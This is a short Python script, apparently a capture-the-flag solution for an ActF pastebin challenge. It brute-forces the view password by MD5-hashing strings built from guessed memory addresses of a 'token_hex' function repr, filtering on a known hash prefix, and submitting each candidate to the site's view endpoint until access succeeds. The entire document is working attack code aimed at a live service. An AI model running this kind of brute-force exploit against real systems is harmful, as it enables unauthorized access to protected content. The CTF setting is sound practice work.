import hashlib
import requests 

url = "https://pastebin.web.actf.co"

for x in range(int(0x7b536e2b379d), 0, -1):
    s = 'password-<function token_hex at 0x{:x}>'.format(x)
    hash = hashlib.md5(s.encode()).hexdigest()
    print(s, hash)

    if hash[:6] == '1797c2':
        print(s, hash)
        r = requests.get(
            f"{url}/view?id=0&password={hash}"
        )
        if not "Incorrect" in r.text:
            print(r.text)
            exit(0)